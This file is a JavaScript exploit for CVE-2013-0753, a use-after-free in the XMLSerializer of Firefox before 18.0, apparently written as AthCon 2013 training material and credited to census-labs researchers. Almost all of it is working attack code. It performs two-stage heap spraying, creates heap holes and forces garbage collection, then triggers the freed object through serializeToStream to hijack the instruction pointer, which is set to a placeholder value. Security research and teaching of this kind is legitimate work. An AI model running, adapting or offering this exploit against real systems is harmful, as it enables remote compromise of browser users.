// Mozilla Firefox < 18.0 XMLSerializer UAF (CVE-2013-0753)
// Part of AthCon 2013 Firefox exploitation material
// argp <argp@census-labs.com>, huku <huku@census-labs.com>
//
// Based on the work submitted to ZDI by regenrecht <regenrecht@o2.pl>
//
// For more information, have a look at the links below:
// http://www.mozilla.org/security/announce/2013/mfsa2013-16.html
// https://bugzilla.mozilla.org/show_bug.cgi?id=814001

// Size and number of allocations to perform during first stage heap spraying.
// This stage targets the class pointed to by `mNextSibling' of an instance of
// `nsHTMLElement'.
BIG_SPRAY_SZ = 65534;     // XXX: Upper limit of `SpiderMonkey' string length?
BIG_SPRAY_NUM = 1 << 11;

// Second stage heap spraying should reach this address.
NEXT_SIBLING_HIGH = 0x00000001;
NEXT_SIBLING_LOW  = 0x17012000;

// Set the instruction pointer to this value.
RIP_HIGH = 0x41424344;
RIP_LOW  = 0x45464748;

// Number of allocations to perform during second stage heap spraying. 
// This stage targets an instance of `HTMLElement'.
SMALL_SPRAY_NUM = 1 << 21;

// Number of DOM children to create that will trigger the UAF.
NUM_CHILDREN = 64;

// See `trigger_gc()' for this one.
GC_TRIGGER_THRESHOLD = 100000;


// Pad `str' to the left using character `pad' up to `length' characters.
function lpad(str, pad, length)
{
    while(str.length < length)
        str = pad + str;
    return str;
}

// Doubleword to little endian unicode string.
function get_dwle(dw)
{
    wh = lpad(((dw >> 16) & 0xffff).toString(16), "0", 4);
    wl = lpad((dw & 0xffff).toString(16), "0", 4);

    escaped = "%u" + wl + "%u" + wh;
    return unescape(escaped);
}

// Quadword to little endian unicode string (due to limited precision, we can't
// pass this function a 64bit integer, we use two doublewords instead).
function get_qwle(dwh, dwl)
{
    return get_dwle(dwl) + get_dwle(dwh);
}

// Essential part of all heap spraying codes :p
function generate(pad, len) 
{
    while(pad.length < len / 2)
        pad += pad;

    return pad.substring(0, (len / 2) - 1);
}

// Trigger the garbage collector.
function trigger_gc()
{
    var gc = [];
    
    for(i = 0; i < GC_TRIGGER_THRESHOLD; i++)
    {
        gc[i] = new Array();
    }

    return gc;
}


// The entry point of the exploit.
function exploit()
{
    var container_1 = [];
    var container_2 = [];


    ////////// HEAP SPRAYING STAGE ONE //////////

    var buf = "";

    // The value of `rax' in `callq *0x5f8(%rax)'.
    buf += get_qwle(NEXT_SIBLING_HIGH, NEXT_SIBLING_LOW);

    // Flags checked at `testb $0x8, 0x2c(%r14)'.
    buf += unescape("%u8888%u8888%u8888%u8888");
    buf += unescape("%u8888%u8888%u8888%u8888");

    // Value of `rip', should be at `%rax + 0x5f8'
    buf += get_qwle(RIP_HIGH, RIP_LOW);

    buf = generate(buf, BIG_SPRAY_SZ);
    for(i = 0; i < BIG_SPRAY_NUM; i++)
        container_1[i] = buf.toLowerCase();


    ////////// HEAP SPRAYING STAGE TWO //////////

    // Creates heap holes of size `sizeof(HTMLElement)'.
    // `mozilla-central/content/html/content/src/HTMLElement.cpp#13'

    // `15 * 8 = 120' bytes.
    buf = "";
    for(i = 0; i < 15; i++)
        buf += get_qwle(NEXT_SIBLING_HIGH, NEXT_SIBLING_LOW);

    // Extra 6 bytes plus 2 for an implicit `%u0000' for a total of 128. 
    buf += unescape("%u4141%u4141%u4141");
    buf = buf.substring(0,  128 / 2 - 1);

    // Perform several allocations.
    for (i = 0; i < SMALL_SPRAY_NUM; i++)
        container_2[i] = buf.toLowerCase();

    // Free every other allocation to create holes.
    for(i = 0; i < SMALL_SPRAY_NUM; i += 2)
    {
        delete container_2[i];
        container_2[i] = null;
    }

    // Make sure the holes are physically deallocated.
    trigger_gc();


    ////////// FILL HEAP HOLES //////////

    var parent = document.createElement("parent");
    var children = [];

    // XXX: `regenrecht' uses `text' to assign attribute `foo' to the children 
    // nodes. Do we really need it?
    var text = 'x';
    while(text.length <= 1024)
        text += text;

    // Each call to `createElement()' allocates an `HTMLElement'. These regions
    // will most likely fall within the holes we created in the previous step.
    for(i = 0; i < NUM_CHILDREN; i++)
        children[i] = document.createElement("child_" + i);

    for(i = 0; i < NUM_CHILDREN; i++)
        parent.appendChild(children[i]);

    for(i = 0; i < NUM_CHILDREN; i++)
        children[i].setAttribute("foo", text);


    ////////// TRIGGER THE USE AFTER FREE //////////

    var s = new XMLSerializer();

    var stream = 
    {
        write: function() 
        {
            // Remove children and trigger the garbage collector. This will 
            // create some heap holes within the chunks we control.
            for (i = 0; i < NUM_CHILDREN; i++)
            {
                parent.removeChild(children[i])
                delete children[i];
                children[i] = null;
            }
      
            trigger_gc();
      
            // Take control of the holes created above (`buf' still holds the 
            // required data).
            for (i = 0; i < SMALL_SPRAY_NUM; i += 2)
              container_2[i] = buf.toLowerCase();
        }
    };

    s.serializeToStream(parent, stream, "UTF-8");


    // Not sure if we really need this. Make sure `container_1[]' is not 
    // optimized away or garbage collected before we get here.
    for(i = 0; i < container_1.length; i++)
        container_1[i] = null;

    // Same for `container_2[]'.
    for(i = 0; i < container_2.length; i++)
        container_2[i] = null;
}

// EOF